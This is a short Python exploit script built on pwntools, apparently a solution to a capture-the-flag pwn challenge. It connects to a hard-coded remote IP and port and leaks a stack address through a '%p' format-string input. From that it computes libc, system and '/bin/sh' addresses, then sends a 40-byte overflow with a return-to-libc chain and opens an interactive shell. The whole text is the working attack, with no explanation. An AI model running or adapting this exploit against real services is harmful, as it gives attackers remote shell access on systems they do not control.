from pwn import * # type: ignore  # noqa: F403

remote_conn = remote('35.209.254.29', 32392)  # type: ignore # noqa: F405


def leak_address():
    remote_conn.recvuntil(b'What\'s your name?')
    remote_conn.sendline(b'%p')
    remote_conn.recvuntil(b'Hello, ')
    leaked_address = int(remote_conn.recvline().decode().strip(), 16)
    return leaked_address

stack_address = leak_address()

libc_base = stack_address - 0x26C0
system_addr = libc_base + 0x52990
bin_sh_addr = libc_base + 0x1B45BD

log.info(f'Stack Address: {hex(stack_address)}')  # type: ignore # noqa: F405
log.info(f'Libc Base Address: {hex(libc_base)}')  # type: ignore # noqa: F405
log.info(f'System Address: {hex(system_addr)}')  # type: ignore # noqa: F405
log.info(f'Address of "/bin/sh": {hex(bin_sh_addr)}')  # type: ignore # noqa: F405

payload = b'A' * 40
payload += p64(system_addr)  # type: ignore # noqa: F405
payload += p64(0x0)  # type: ignore # noqa: F405
payload += p64(bin_sh_addr)  # type: ignore # noqa: F405

remote_conn.sendline(payload)

remote_conn.interactive()